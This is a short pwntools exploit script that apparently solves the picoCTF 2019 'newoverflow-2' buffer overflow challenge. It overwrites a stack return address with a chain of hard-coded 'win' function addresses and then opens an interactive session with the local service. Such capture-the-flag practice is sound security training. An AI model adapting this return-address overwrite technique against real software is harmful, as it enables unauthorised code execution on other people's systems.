#!/usr/bin/env python3

from pwn import *
# from getpass import getpass

# pico_user = input("Username: ")[:-1]
# pico_pass = getpass("Password: ")

# conn = ssh(host = '2019shell1.picoctf.com', user = pico_user, password = pico_pass)

# location = '/problems/newoverflow-2_4_2cbec72146545064c6623c465faba84e'

# vuln = process("./vuln")
vuln = remote("0.0.0.0", 9995)

payload = b''

payload += b'A' * (0x40 + 0x8)           # padding
payload += p64(0x00400777)               # win1

payload += b'A' * 0x8                    # rbp
payload += p64(0x004007b4)               # win2

payload += b'A' * 0x8                    # rbp
payload += p64(0x004007be)               # win

# vuln = conn.process(location + '/vuln', cwd = location)
print(vuln.recvuntil('?'))

vuln.sendline(payload)
vuln.interactive()
